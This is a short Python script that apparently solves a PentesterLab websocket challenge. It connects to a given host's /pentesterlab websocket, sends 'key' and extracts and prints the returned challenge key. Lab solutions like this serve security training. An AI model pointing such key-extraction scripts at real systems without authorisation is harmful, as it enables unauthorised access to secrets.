import asyncio
from websockets import connect
import sys
import re

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

if len(sys.argv) != 2:
    print(f"Usage:\n\tpython3 {sys.argv[0]} <HOSTNAME>")
    sys.exit(1)

hostname = sys.argv[1]


async def connect_ws(hostname):
    async with connect(f'ws://{hostname}/pentesterlab') as websocket:
        await websocket.send("key")
        return await websocket.recv()

response = asyncio.run(connect_ws(hostname))
key = re.search(r"[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*", response).group()
print(f"[+] The key for this challenge is {GREEN}{key}{RESET}")
